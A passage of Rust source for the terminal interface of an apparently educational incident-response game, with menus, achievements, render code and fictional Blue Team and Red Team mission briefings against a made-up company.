    fn show_achievements(&self) -> Vec<String> {
        use crate::data::player::Achievement;

        let all_achievements = [
            Achievement::FirstBlood,
            Achievement::SpeedDemon,
            Achievement::Ghost,
            Achievement::DomainDomination,
            Achievement::CaffeinatedI,
            Achievement::CaffeinatedII,
            Achievement::CaffeinatedIII,
            Achievement::TheMatrix,
            Achievement::L33tHax0r,
            Achievement::EasterEggHunter,
        ];

        let mut output = vec![
            "╔══════════════════════════════════════════════════════════════╗".to_string(),
            "║                    🏆 ACHIEVEMENTS 🏆                        ║".to_string(),
            "╠══════════════════════════════════════════════════════════════╣".to_string(),
        ];

        let unlocked = self.game.player.achievements.len();
        let total = all_achievements.len();

        for achievement in &all_achievements {
            let has_it = self.game.player.has_achievement(*achievement);
            let status = if has_it {
                format!("{} {} - {}", achievement.icon(), achievement.name(), achievement.description())
            } else {
                format!("🔒 ??? - {}", "Complete to unlock")
            };
            output.push(format!("║  {:<60} ║", status));
        }

        output.push("╠══════════════════════════════════════════════════════════════╣".to_string());
        output.push(format!("║  Progress: {}/{} achievements unlocked{:>26} ║", unlocked, total, ""));
        output.push(format!("║  Easter eggs found: {}{:>39} ║", self.game.player.easter_eggs_found.len(), ""));
        output.push("╚══════════════════════════════════════════════════════════════╝".to_string());

        output
    }

    // Quick action handlers
    fn handle_examine(&mut self) {
        self.command_output.push("[ACTION] Opening evidence panel...".to_string());
        self.command_output.push("[TIP] Type ':analyze <id>' to examine specific evidence".to_string());
        self.current_screen = Screen::Evidence;
    }

    fn handle_interview(&mut self) {
        self.command_output.push("[ACTION] Interview mode...".to_string());
        self.command_output.push("[TIP] Type ':interview <name>' - Available: john, sarah, michael".to_string());
    }

    fn handle_scan(&mut self) {
        self.command_output.push("[ACTION] Scan mode...".to_string());
        self.command_output.push("[TIP] Type ':scan <hostname>' to scan a system".to_string());
        self.command_output.push("[TIP] Type ':systems' to see available targets".to_string());
    }

    fn handle_contain(&mut self) {
        self.command_output.push("[ACTION] Containment mode...".to_string());
        self.command_output.push("[TIP] Type ':contain <hostname>' to isolate a system".to_string());
        self.command_output.push("[WARN] Containment will disconnect the system!".to_string());
    }

    fn handle_add_note(&mut self) {
        self.input_mode = InputMode::Command;
        self.input_buffer = "note ".to_string();
    }

    fn handle_report(&mut self) {
        self.command_output.push("[ACTION] Generating incident report...".to_string());
        self.command_output.push("─────────────────────────────────────────────────────".to_string());
        self.command_output.push("INCIDENT REPORT - DRAFT".to_string());
        self.command_output.push("─────────────────────────────────────────────────────".to_string());
        self.command_output.push("Type: Phishing / Malware Infection".to_string());
        self.command_output.push("Initial Vector: Malicious email attachment".to_string());
        self.command_output.push("Affected Systems: WS-JSMITH (confirmed)".to_string());
        self.command_output.push("Threat Actor: Unknown (financially motivated)".to_string());
        self.command_output.push("Status: Investigation in progress".to_string());
        self.command_output.push("─────────────────────────────────────────────────────".to_string());
    }

    fn handle_escape(&mut self) {
        match self.current_screen {
            Screen::Playing => self.current_screen = Screen::Paused,
            Screen::Paused => self.current_screen = Screen::Playing,
            Screen::Timeline | Screen::Evidence | Screen::Systems |
            Screen::Interview | Screen::Report => {
                self.current_screen = Screen::Playing;
            }
            Screen::ModeSelect => {
                self.current_screen = Screen::MainMenu;
                self.menu_state.select(Some(0));
            }
            Screen::NewGame => {
                self.current_screen = Screen::ModeSelect;
                self.menu_state.select(Some(0));
            }
            Screen::GameOver => self.current_screen = Screen::MainMenu,
            _ => {}
        }
    }

    fn navigate_up(&mut self) {
        let i = self.menu_state.selected().unwrap_or(0);
        if i > 0 {
            self.menu_state.select(Some(i - 1));
        }
    }

    fn navigate_down(&mut self) {
        let max = match self.current_screen {
            Screen::MainMenu => 3,
            Screen::ModeSelect => 1,  // Blue Team, Red Team
            Screen::NewGame => 4,
            _ => 10,
        };
        let i = self.menu_state.selected().unwrap_or(0);
        if i < max {
            self.menu_state.select(Some(i + 1));
        }
    }

    fn handle_enter(&mut self) {
        match self.current_screen {
            Screen::MainMenu => {
                match self.menu_state.selected() {
                    Some(0) => {
                        self.current_screen = Screen::ModeSelect;
                        self.menu_state.select(Some(0));
                    }
                    Some(1) => self.current_screen = Screen::LoadGame,
                    Some(2) => self.show_help = true,
                    Some(3) => self.running = false,
                    _ => {}
                }
            }
            Screen::ModeSelect => {
                match self.menu_state.selected() {
                    Some(0) => {
                        // Blue Team selected
                        self.game_mode = GameMode::BlueTeam;
                        self.current_screen = Screen::NewGame;
                        self.menu_state.select(Some(0));
                    }
                    Some(1) => {
                        // Red Team selected
                        self.game_mode = GameMode::RedTeam;
                        self.current_screen = Screen::NewGame;
                        self.menu_state.select(Some(0));
                    }
                    _ => {}
                }
            }
            Screen::NewGame => {
                match self.menu_state.selected() {
                    Some(i) => {
                        let level = match i {
                            0 => ExperienceLevel::Intern,
                            1 => ExperienceLevel::JuniorAnalyst,
                            2 => ExperienceLevel::SeniorAnalyst,
                            3 => ExperienceLevel::IRLead,
                            4 => ExperienceLevel::CISO,
                            _ => ExperienceLevel::JuniorAnalyst,
                        };
                        self.start_new_game(level);
                    }
                    _ => {}
                }
            }
            Screen::Playing => {
                // Handle action selection
            }
            _ => {}
        }
    }

    fn cycle_panel(&mut self) {
        self.selected_panel = match self.selected_panel {
            Panel::Actions => Panel::Messages,
            Panel::Messages => Panel::Evidence,
            Panel::Evidence => Panel::Systems,
            Panel::Systems => Panel::Actions,
        };
    }

    fn handle_coffee(&mut self) {
        if self.current_screen == Screen::Playing {
            let _ = self.game.execute_action(GameAction::DrinkCoffee);
        }
    }

    fn start_new_game(&mut self, level: ExperienceLevel) {
        self.game = Game::new("Operator", level);
        self.game.phase = GamePhase::Briefing;

        // Load the first scenario
        let scenario = crate::game::scenario::create_phishing_scenario();
        self.game.scenario = Some(scenario);

        self.current_screen = Screen::Playing;
        self.menu_state.select(Some(0));
        self.input_mode = InputMode::Normal;
        self.red_team_state = RedTeamState::default();

        // Reset command output
        self.command_output.clear();

        match self.game_mode {
            GameMode::BlueTeam => {
                // Blue Team briefing
                self.command_output.push("═══════════════════════════════════════════════════════════".to_string());
                self.command_output.push("[SYSTEM] 🛡️  INCIDENT RESPONSE CONSOLE v1.0".to_string());
                self.command_output.push("[SYSTEM] Analyst logged in. Security clearance: AUTHORIZED".to_string());
                self.command_output.push("═══════════════════════════════════════════════════════════".to_string());
                self.command_output.push("".to_string());
                self.command_output.push("[ALERT] ⚠ PRIORITY INCIDENT DETECTED ⚠".to_string());
                self.command_output.push("".to_string());
                self.command_output.push("[BRIEFING] It's Monday morning. You've just started your shift".to_string());
                self.command_output.push("[BRIEFING] when an EDR alert catches your attention -".to_string());
                self.command_output.push("[BRIEFING] suspicious PowerShell activity on a Finance workstation.".to_string());
                self.command_output.push("".to_string());
                self.command_output.push("[BRIEFING] The user, John Smith, says he \"just opened an email".to_string());
                self.command_output.push("[BRIEFING] attachment from a vendor.\"".to_string());
                self.command_output.push("".to_string());
                self.command_output.push("[BRIEFING] Now you need to figure out how bad this is and".to_string());
                self.command_output.push("[BRIEFING] stop it before it gets worse.".to_string());
                self.command_output.push("".to_string());
                self.command_output.push("[SYSTEM] Good luck, analyst. The clock is ticking.".to_string());
                self.command_output.push("═══════════════════════════════════════════════════════════".to_string());
                self.command_output.push("".to_string());
                self.command_output.push("[TIP] Press SPACE, : or / to enter commands".to_string());
                self.command_output.push("[TIP] Press 'h' for help, or type 'help' in command mode".to_string());
                self.command_output.push("[TIP] Quick keys: e=evidence, i=interview, s=scan, c=contain".to_string());
            }
            GameMode::RedTeam => {
                // Red Team briefing - you are the attacker!
                self.command_output.push("═══════════════════════════════════════════════════════════".to_string());
                self.command_output.push("[SYSTEM] ☠️  ADVERSARY C2 CONSOLE v3.1.337".to_string());
                self.command_output.push("[SYSTEM] Operator authenticated. Welcome back.".to_string());
                self.command_output.push("═══════════════════════════════════════════════════════════".to_string());
                self.command_output.push("".to_string());
                self.command_output.push("[MISSION] ══════════════════════════════════════════════════".to_string());
                self.command_output.push("".to_string());
                self.command_output.push("[MISSION] TARGET: Acme Corporation".to_string());
                self.command_output.push("[MISSION] OBJECTIVE: Exfiltrate financial data".to_string());
                self.command_output.push("[MISSION] REWARD: $500,000 BTC".to_string());
                self.command_output.push("".to_string());
                self.command_output.push("[INTEL] Your reconnaissance has identified several employees".to_string());
                self.command_output.push("[INTEL] in the Finance department. One target looks promising:".to_string());
                self.command_output.push("[INTEL] John Smith - Financial Analyst".to_string());
                self.command_output.push("[INTEL] Email: jsmith@acme-corp.com".to_string());
                self.command_output.push("[INTEL] LinkedIn shows he handles vendor invoices.".to_string());
                self.command_output.push("".to_string());
                self.command_output.push("[MISSION] Your task: Gain initial access, establish persistence,".to_string());
                self.command_output.push("[MISSION] escalate privileges, and exfiltrate the Q4 financials.".to_string());
                self.command_output.push("".to_string());
                self.command_output.push("[WARN] The SOC is active. Avoid detection or face mission failure.".to_string());
                self.command_output.push("═══════════════════════════════════════════════════════════".to_string());
                self.command_output.push("".to_string());
                self.command_output.push("[TIP] Type 'help' for available commands".to_string());
                self.command_output.push("[TIP] Commands: recon, phish, exploit, implant, pivot, exfil".to_string());
                self.command_output.push("".to_string());
                self.red_team_state.current_target = Some("John Smith".to_string());
            }
        }
        self.command_output.push("".to_string());
    }

    /// Render the UI
    pub fn render(&mut self, frame: &mut Frame) {
        match self.current_screen {
            Screen::MainMenu => self.render_main_menu(frame),
            Screen::ModeSelect => self.render_mode_select(frame),
            Screen::NewGame => self.render_new_game(frame),
            Screen::Playing | Screen::Paused => self.render_game(frame),
            Screen::Help => self.render_help(frame),
            Screen::Timeline => self.render_timeline(frame),
            Screen::GameOver => self.render_game_over(frame),
            _ => self.render_game(frame),
        }

        // Overlay help if showing
        if self.show_help {
            self.render_help_overlay(frame);
        }
    }

    fn render_mode_select(&mut self, frame: &mut Frame) {
        let area = frame.area();
        frame.render_widget(Clear, area);

        let chunks = Layout::default()
            .direction(Direction::Vertical)
            .margin(2)
            .constraints([
                Constraint::Length(5),
                Constraint::Length(3),
                Constraint::Min(12),
                Constraint::Length(3),
            ])
            .split(area);

        // Title
        let title = Paragraph::new(vec![
            Line::from(""),
            Line::from(vec![
                Span::styled("SELECT YOUR ROLE", Style::default().fg(Color::Cyan).add_modifier(Modifier::BOLD)),
            ]),
        ])
        .alignment(Alignment::Center)
        .block(Block::default().borders(Borders::ALL).border_style(Style::default().fg(self.theme.border)));
        frame.render_widget(title, chunks[0]);

        // Mode options with descriptions
        let items = vec![
            ListItem::new(vec![
                Line::from(""),
                Line::from(vec![
                    Span::styled("  🛡️  BLUE TEAM - Incident Responder", Style::default().fg(Color::Cyan).add_modifier(Modifier::BOLD)),
                ]),
                Line::from(vec![
                    Span::styled("      Investigate breaches, analyze threats, and protect your organization.", Style::default().fg(Color::DarkGray)),
                ]),
                Line::from(vec![
                    Span::styled("      Collect evidence, interview witnesses, contain the attack.", Style::default().fg(Color::DarkGray)),
                ]),
                Line::from(""),
            ]),
            ListItem::new(vec![
                Line::from(""),
                Line::from(vec![
                    Span::styled("  ☠️  RED TEAM - Adversary Operator", Style::default().fg(Color::Red).add_modifier(Modifier::BOLD)),
                ]),
                Line::from(vec![
                    Span::styled("      Infiltrate the target, evade detection, and exfiltrate data.", Style::default().fg(Color::DarkGray)),
                ]),
                Line::from(vec![
                    Span::styled("      Craft phishing lures, exploit vulnerabilities, move laterally.", Style::default().fg(Color::DarkGray)),
                ]),
                Line::from(""),
            ]),
        ];

        let mode_list = List::new(items)
            .block(styled_block("Choose Your Path", &self.theme))
            .highlight_style(
                Style::default()
                    .add_modifier(Modifier::BOLD | Modifier::REVERSED),
            )
            .highlight_symbol("▶ ");

        frame.render_stateful_widget(mode_list, chunks[2], &mut self.menu_state);

        // Footer
        let footer = Paragraph::new("↑/↓ to select, Enter to confirm, Esc to go back")
            .style(Style::default().fg(self.theme.border))
            .alignment(Alignment::Center);
        frame.render_widget(footer, chunks[3]);
    }

    fn render_main_menu(&mut self, frame: &mut Frame) {
        let area = frame.area();

        // Background
        frame.render_widget(Clear, area);
        frame.render_widget(
            Block::default().style(Style::default().bg(self.theme.bg)),
            area,
        );

        // For small terminals, use compact layout
        let menu_height: u16 = 8;

        if area.height < 30 {
            // Compact mode - just show menu, skip big logo
            let title = Paragraph::new("═══ INCIDENT RESPONSE ═══")
                .style(Style::default().fg(self.theme.accent).add_modifier(Modifier::BOLD))
                .alignment(Alignment::Center);
            frame.render_widget(title, Rect::new(0, 1, area.width, 1));

            let subtitle = Paragraph::new("Chronicles of a Security Analyst")
                .style(Style::default().fg(self.theme.header))
                .alignment(Alignment::Center);
            frame.render_widget(subtitle, Rect::new(0, 2, area.width, 1));

            let by_line = Paragraph::new("Created by Cipher")
                .style(Style::default().fg(self.theme.border))
                .alignment(Alignment::Center);
            frame.render_widget(by_line, Rect::new(0, 3, area.width, 1));

            // Menu centered vertically
            let menu_y = (area.height.saturating_sub(menu_height)) / 2;
            let menu_area = Rect::new(
                area.width / 4,
                menu_y.max(5),
                area.width / 2,
                menu_height.min(area.height.saturating_sub(menu_y).saturating_sub(2)),
            );

            let menu_items = vec![
                ListItem::new("  ▶ New Game"),
                ListItem::new("  ▶ Load Game"),
                ListItem::new("  ▶ Help"),
                ListItem::new("  ▶ Quit"),
            ];

            let menu = List::new(menu_items)
                .block(styled_block("Main Menu", &self.theme))
                .highlight_style(
                    Style::default()
                        .fg(self.theme.accent)
                        .add_modifier(Modifier::BOLD | Modifier::REVERSED),
                )
                .highlight_symbol("→ ");

            frame.render_stateful_widget(menu, menu_area, &mut self.menu_state);

            // Footer - ensure it doesn't go past bounds
            if area.height > 1 {
                let footer = Paragraph::new("Press ? for help | q to quit")
                    .style(Style::default().fg(self.theme.border))
                    .alignment(Alignment::Center);
                frame.render_widget(
                    footer,
                    Rect::new(0, area.height.saturating_sub(1), area.width, 1),
                );
            }
            return;
        }

        // Full logo mode for large terminals
        let logo_height = LOGO.lines().count() as u16;
        let total_height = logo_height + menu_height + 2;
        let start_y = area.height.saturating_sub(total_height) / 2;

        // Logo
        let logo_area = Rect::new(
            area.x,
            start_y,
            area.width,
            logo_height.min(area.height.saturating_sub(start_y)),
        );
        let logo = Paragraph::new(LOGO)
            .style(Style::default().fg(self.theme.accent))
            .alignment(Alignment::Center);
        frame.render_widget(logo, logo_area);

        // Menu
        let menu_y = start_y + logo_height + 2;
        let menu_area = Rect::new(
            area.width / 4,
            menu_y.min(area.height.saturating_sub(menu_height).saturating_sub(1)),
            area.width / 2,
            menu_height.min(area.height.saturating_sub(menu_y).saturating_sub(1)),
        );

        let menu_items = vec![
            ListItem::new("  ▶ New Game"),
            ListItem::new("  ▶ Load Game"),
            ListItem::new("  ▶ Help"),
            ListItem::new("  ▶ Quit"),
        ];

        let menu = List::new(menu_items)
            .block(styled_block("Main Menu", &self.theme))
            .highlight_style(
                Style::default()
                    .fg(self.theme.accent)
                    .add_modifier(Modifier::BOLD | Modifier::REVERSED),
            )
            .highlight_symbol("→ ");

        frame.render_stateful_widget(menu, menu_area, &mut self.menu_state);

        // Footer - ensure bounds
        if area.height > 1 {
            let footer = Paragraph::new("Press ? for help | q to quit")
                .style(Style::default().fg(self.theme.border))
                .alignment(Alignment::Center);
            frame.render_widget(
                footer,
                Rect::new(0, area.height.saturating_sub(1), area.width, 1),
            );
        }
    }

    fn render_new_game(&mut self, frame: &mut Frame) {
        let area = frame.area();
        frame.render_widget(Clear, area);

        let chunks = Layout::default()
            .direction(Direction::Vertical)
            .margin(2)
            .constraints([
                Constraint::Length(3),
                Constraint::Length(3),
                Constraint::Min(10),
            ])
            .split(area);

        // Title
        let title = Paragraph::new("SELECT DIFFICULTY")
            .style(Style::default().fg(self.theme.accent).add_modifier(Modifier::BOLD))
            .alignment(Alignment::Center);
        frame.render_widget(title, chunks[0]);

        // Difficulty options
        let items = vec![
            ListItem::new(vec![
                Line::from(vec![
                    Span::styled("  Security Intern", Style::default().fg(Color::Green)),
                ]),
                Line::from(vec![
                    Span::styled("    Tutorial mode. Helpful hints throughout.", Style::default().fg(Color::DarkGray)),
                ]),
            ]),
            ListItem::new(vec![
                Line::from(vec![
                    Span::styled("  Junior SOC Analyst", Style::default().fg(Color::Cyan)),
                ]),
                Line::from(vec![
                    Span::styled("    Standard difficulty. Some guidance available.", Style::default().fg(Color::DarkGray)),
                ]),
            ]),
            ListItem::new(vec![
                Line::from(vec![
                    Span::styled("  Senior Analyst", Style::default().fg(Color::Yellow)),
                ]),
                Line::from(vec![
                    Span::styled("    Challenging. Limited hints.", Style::default().fg(Color::DarkGray)),
                ]),
            ]),
            ListItem::new(vec![
                Line::from(vec![
                    Span::styled("  IR Lead", Style::default().fg(Color::Red)),
                ]),
                Line::from(vec![
                    Span::styled("    Hard. Time pressure. Lead the team.", Style::default().fg(Color::DarkGray)),
                ]),
            ]),
            ListItem::new(vec![
                Line::from(vec![
                    Span::styled("  CISO", Style::default().fg(Color::Magenta)),
                ]),
                Line::from(vec![
                    Span::styled("    Expert. Business consequences. No hints.", Style::default().fg(Color::DarkGray)),
                ]),
            ]),
        ];

        let menu = List::new(items)
            .block(styled_block("Choose Your Role", &self.theme))
            .highlight_style(
                Style::default()
                    .add_modifier(Modifier::BOLD | Modifier::REVERSED),
            )
            .highlight_symbol("→ ");

        frame.render_stateful_widget(menu, chunks[2], &mut self.menu_state);
    }

    fn render_game(&mut self, frame: &mut Frame) {
        let area = frame.area();
        let layout = create_main_layout(area);

        // Header
        self.render_header(frame, layout[0]);

        // Content area
        let content_layout = create_content_layout(layout[1]);

        // Side panel (actions/systems)
        self.render_side_panel(frame, content_layout[0]);

        // Main area
        let main_layout = create_main_area_layout(content_layout[1]);

        // Messages/narrative
        self.render_messages(frame, main_layout[0]);

        // Evidence/details
        self.render_evidence_panel(frame, main_layout[1]);

        // Status bar
        self.render_status_bar(frame, layout[2]);

        // Pause overlay
        if self.current_screen == Screen::Paused {
            self.render_pause_overlay(frame);
        }
    }

    fn render_header(&self, frame: &mut Frame, area: Rect) {
        let header_layout = Layout::default()
            .direction(Direction::Horizontal)
            .constraints([
                Constraint::Length(22),
                Constraint::Min(20),
                Constraint::Length(30),
            ])
            .split(area);

        // Logo
        let logo = Paragraph::new(SMALL_LOGO)
            .style(Style::default().fg(self.theme.accent).add_modifier(Modifier::BOLD))
            .block(Block::default().borders(Borders::ALL).border_style(Style::default().fg(self.theme.border)));
        frame.render_widget(logo, header_layout[0]);

        // Scenario title
        let scenario_title = if let Some(ref scenario) = self.game.scenario {
            scenario.title.clone()
        } else {
            "No Active Incident".to_string()
        };
        let title = Paragraph::new(scenario_title)
            .style(Style::default().fg(self.theme.warning))
            .alignment(Alignment::Center)
            .block(Block::default().borders(Borders::ALL).border_style(Style::default().fg(self.theme.border)));
        frame.render_widget(title, header_layout[1]);

        // Time/turn
        let time_text = format!(
            " Turn {} | {} ",
            self.game.stats.turns_taken,
            self.game.timeline.current_time.format("%H:%M")
        );
        let time = Paragraph::new(time_text)
            .style(Style::default().fg(self.theme.fg))
            .alignment(Alignment::Right)
            .block(Block::default().borders(Borders::ALL).border_style(Style::default().fg(self.theme.border)));
        frame.render_widget(time, header_layout[2]);
    }

    fn render_side_panel(&mut self, frame: &mut Frame, area: Rect) {
        let chunks = Layout::default()
            .direction(Direction::Vertical)
            .constraints([
                Constraint::Length(6),   // Player status
                Constraint::Min(10),     // Actions
            ])
            .split(area);

        // Player status
        let status_text = vec![
            Line::from(vec![
                Span::raw("Energy: "),
                Span::styled(
                    format!("{}%", self.game.player.energy),
                    Style::default().fg(if self.game.player.energy < 30 { Color::Red } else { Color::Green }),
                ),
            ]),
            Line::from(vec![
                Span::raw("Stress: "),
                Span::styled(
                    format!("{}%", self.game.player.stress),
                    Style::default().fg(if self.game.player.stress > 70 { Color::Red } else { Color::Yellow }),
                ),
            ]),
            Line::from(vec![
                Span::raw("☕ Coffee: "),
                Span::styled(format!("{}", self.game.player.coffee_consumed), Style::default().fg(Color::Cyan)),
            ]),
        ];
        let status = Paragraph::new(status_text)
            .block(styled_block("Analyst", &self.theme));
        frame.render_widget(status, chunks[0]);

        // Actions
        let actions = vec![
            ListItem::new("  [E] Examine Evidence"),
            ListItem::new("  [I] Interview NPC"),
            ListItem::new("  [S] Scan System"),
            ListItem::new("  [C] Contain System"),
            ListItem::new("  [T] View Timeline"),
            ListItem::new("  [R] Generate Report"),
            ListItem::new("  ───────────────────"),
            ListItem::new("  [F1] Coffee Break"),
            ListItem::new("  [Esc] Pause"),
        ];
        let action_list = List::new(actions)
            .block(styled_block("Actions", &self.theme))
            .highlight_style(Style::default().add_modifier(Modifier::REVERSED));
        frame.render_widget(action_list, chunks[1]);
    }

    fn render_messages(&self, frame: &mut Frame, area: Rect) {
        // Split area for terminal output and input line
        let chunks = Layout::default()
            .direction(Direction::Vertical)
            .constraints([
                Constraint::Min(3),      // Terminal output
                Constraint::Length(3),   // Input line
            ])
            .split(area);

        // Terminal output - show command output with colors
        let visible_lines = chunks[0].height.saturating_sub(2) as usize;
        let start = self.command_output.len().saturating_sub(visible_lines);
        let output_lines: Vec<Line> = self.command_output[start..].iter().map(|line| {
            // Color code different types of output
            let (color, bold) = if line.starts_with("[ERROR]") {
                (Color::Red, true)
            } else if line.starts_with("[ALERT]") {
                (Color::Red, true)
            } else if line.starts_with("[WARN]") {
                (Color::Yellow, true)
            } else if line.starts_with("[SUCCESS]") {
                (Color::Green, true)
            } else if line.starts_with("[BRIEFING]") {
                (Color::Yellow, false)
            } else if line.starts_with("[SYSTEM]") {
                (Color::Cyan, false)
            } else if line.starts_with("[SCAN]") || line.starts_with("[CONTAIN]") {
                (Color::Blue, false)
            } else if line.starts_with("[FINDING]") || line.starts_with("[RESULT]") {
                (Color::Magenta, false)
            } else if line.starts_with("[IOC]") {
                (Color::Red, false)
            } else if line.starts_with("[EVIDENCE]") || line.starts_with("[LEAD]") {
                (Color::Green, false)
            } else if line.starts_with("[NOTE]") {
                (Color::Yellow, false)
            } else if line.starts_with("[INTERVIEW]") {
                (Color::Cyan, true)
            } else if line.starts_with("[TIP]") {
                (Color::DarkGray, false)
            } else if line.starts_with("[ACTION]") {
                (Color::White, true)
            } else if line.starts_with("[STATUS]") {
                (Color::Cyan, false)
            // Red Team specific colors
            } else if line.starts_with("[C2]") || line.starts_with("[MISSION]") {
                (Color::Red, false)
            } else if line.starts_with("[INTEL]") || line.starts_with("[RECON]") {
                (Color::Magenta, false)
            } else if line.starts_with("[PHISH]") || line.starts_with("[SOCIAL]") {
                (Color::Yellow, false)
            } else if line.starts_with("[DUMP]") || line.starts_with("[CRED]") || line.starts_with("[CREDS]") {
                (Color::Green, false)
            } else if line.starts_with("[PIVOT]") || line.starts_with("[IMPLANT]") {
                (Color::Blue, false)
            } else if line.starts_with("[EXFIL]") || line.starts_with("[LOOT]") {
                (Color::Cyan, true)
            } else if line.starts_with("[STEALTH]") || line.starts_with("[FACTORS]") {
                (Color::DarkGray, false)
            } else if line.starts_with("[OK]") {
                (Color::Green, false)
            } else if line.starts_with("[FAILED]") {
                (Color::Red, false)
            } else if line.starts_with("─") || line.starts_with("═") || line.starts_with("╔") || line.starts_with("║") || line.starts_with("╚") || line.starts_with("┌") || line.starts_with("│") || line.starts_with("└") || line.starts_with("├") {
                (Color::DarkGray, false)
            } else if line.starts_with("You:") {
                (Color::White, true)
            } else if line.contains(":") && (line.starts_with("John") || line.starts_with("Sarah") || line.starts_with("Michael")) {
                (Color::Yellow, false)
            } else {
                (Color::White, false)
            };

            let style = if bold {
                Style::default().fg(color).add_modifier(Modifier::BOLD)
            } else {
                Style::default().fg(color)
            };
            Line::from(Span::styled(line.as_str(), style))
        }).collect();

        let terminal = Paragraph::new(output_lines)
            .block(styled_block("Terminal", &self.theme))
            .wrap(Wrap { trim: false });
        frame.render_widget(terminal, chunks[0]);

        // Command input line
        let input_style = if self.input_mode == InputMode::Command {
            Style::default().fg(Color::Green)
        } else {
            Style::default().fg(Color::DarkGray)
        };

        let prompt = if self.input_mode == InputMode::Command {
            format!("analyst@soc:~$ {}_", self.input_buffer)
        } else {
            "analyst@soc:~$ [Press : or / to type command]".to_string()
        };

        let input = Paragraph::new(prompt)
            .style(input_style)
            .block(Block::default()
                .borders(Borders::ALL)
                .border_style(Style::default().fg(if self.input_mode == InputMode::Command {
                    Color::Green
                } else {
                    self.theme.border
                }))
                .title(" Command "));
        frame.render_widget(input, chunks[1]);
    }

    fn render_evidence_panel(&self, frame: &mut Frame, area: Rect) {
        let evidence_count = self.game.evidence.len();
        let analyzed = self.game.evidence.values().filter(|e| e.is_analyzed).count();

        let text = vec![
            Line::from(vec![
                Span::raw("Evidence Collected: "),
                Span::styled(format!("{}", evidence_count), Style::default().fg(Color::Cyan)),
            ]),
            Line::from(vec![
                Span::raw("Analyzed: "),
                Span::styled(format!("{}", analyzed), Style::default().fg(Color::Green)),
            ]),
            Line::from(""),
            Line::from(vec![
                Span::styled("Press E to examine evidence", Style::default().fg(Color::DarkGray)),
            ]),
        ];

        let evidence = Paragraph::new(text)
            .block(styled_block("Evidence", &self.theme))
            .wrap(Wrap { trim: true });
        frame.render_widget(evidence, area);
    }

    fn render_status_bar(&self, frame: &mut Frame, area: Rect) {
        let status_text = format!(
            " {} | Evidence: {} | Threats: {} | Press ? for help ",
            self.game.player.title,
            self.game.stats.evidence_collected,
            self.game.stats.threats_identified,
        );

        let status = Paragraph::new(status_text)
            .style(Style::default().fg(self.theme.fg).bg(Color::DarkGray));
        frame.render_widget(status, area);
    }

    fn render_pause_overlay(&self, frame: &mut Frame) {
        let area = frame.area();
        let popup_width = 40;
        let popup_height = 10;
        let popup_area = Rect::new(
            (area.width - popup_width) / 2,
            (area.height - popup_height) / 2,
            popup_width,
            popup_height,
        );

        frame.render_widget(Clear, popup_area);

        let pause_text = vec![
            Line::from(""),
            Line::from(vec![
                Span::styled("PAUSED", Style::default().fg(Color::Yellow).add_modifier(Modifier::BOLD)),
            ]),
            Line::from(""),
            Line::from("Press ESC to resume"),
            Line::from("Press Q to quit to menu"),
            Line::from(""),
        ];

        let pause = Paragraph::new(pause_text)
            .alignment(Alignment::Center)
            .block(
                Block::default()
                    .borders(Borders::ALL)
                    .border_style(Style::default().fg(Color::Yellow))
                    .title(" Game Paused ")
            );
        frame.render_widget(pause, popup_area);
    }

    fn render_help_overlay(&self, frame: &mut Frame) {
        let area = frame.area();
        let popup_width = 70.min(area.width - 4);
        let popup_height = 25.min(area.height - 4);
        let popup_area = Rect::new(
            (area.width - popup_width) / 2,
            (area.height - popup_height) / 2,
            popup_width,
            popup_height,
        );

        frame.render_widget(Clear, popup_area);

        let help = Paragraph::new(HELP_TEXT)
            .style(Style::default().fg(self.theme.fg))
            .block(Block::default().borders(Borders::ALL).border_style(Style::default().fg(self.theme.accent)));
        frame.render_widget(help, popup_area);
    }

    fn render_help(&self, frame: &mut Frame) {
        let area = frame.area();
        frame.render_widget(Clear, area);

        let help = Paragraph::new(HELP_TEXT)
            .style(Style::default().fg(self.theme.fg))
            .block(styled_block("Help", &self.theme));
        frame.render_widget(help, area);
    }

    fn render_timeline(&self, _frame: &mut Frame) {
        // Would render the full timeline view
    }

    fn render_game_over(&self, frame: &mut Frame) {
        let area = frame.area();
        frame.render_widget(Clear, area);

        let text = vec![
            Line::from(""),
            Line::from(vec![
                Span::styled("GAME OVER", Style::default().fg(Color::Red).add_modifier(Modifier::BOLD)),
            ]),
            Line::from(""),
            Line::from("Press Enter to return to menu"),
        ];

        let game_over = Paragraph::new(text)
            .alignment(Alignment::Center)
            .block(styled_block("", &self.theme));
        frame.render_widget(game_over, area);
    }
}

impl Default for App {
    fn default() -> Self {
        Self::new()
    }
}
